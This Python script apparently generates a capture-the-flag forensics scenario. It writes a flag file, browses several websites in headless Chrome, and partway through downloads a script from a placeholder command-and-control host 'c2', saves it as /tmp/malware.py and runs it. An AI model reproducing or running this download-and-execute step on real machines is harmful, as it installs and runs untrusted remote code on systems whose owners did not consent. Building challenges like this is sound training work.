#!/usr/bin/env python3

import sys
import time
import subprocess

import requests
from selenium import webdriver

FLAG = sys.argv[1]

with open('flag.txt', 'w') as fout:
    fout.write(FLAG)

chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument('--no-sandbox')
chrome_options.add_argument('--window-size=1920,1080')
chrome_options.add_argument('--headless')
chrome_options.add_argument('--disable-gpu')

driver = webdriver.Chrome(options=chrome_options)

print('Visiting: https://www.python.org')
driver.get("https://www.python.org")
time.sleep(2)
print('Visiting: https://www.google.com')
driver.get("https://www.google.com")
time.sleep(2)

with requests.get("http://c2/phone", stream=True) as r:
    r.raise_for_status()
    with open('/tmp/malware.py', 'wb') as f:
        for chunk in r.iter_content(chunk_size=8192): 
            f.write(chunk)
malware_process = subprocess.Popen(['python3', '/tmp/malware.py'])

print('Visiting: https://www.svt.se')
driver.get("https://www.svt.se")
time.sleep(2)
print('Visiting: https://www.inet.se')
driver.get("https://www.inet.se")
time.sleep(2)
print('Visiting: https://www.kodsport.se')
driver.get("https://www.kodsport.se")
time.sleep(2)

driver.close()

malware_process.wait()

time.sleep(5)
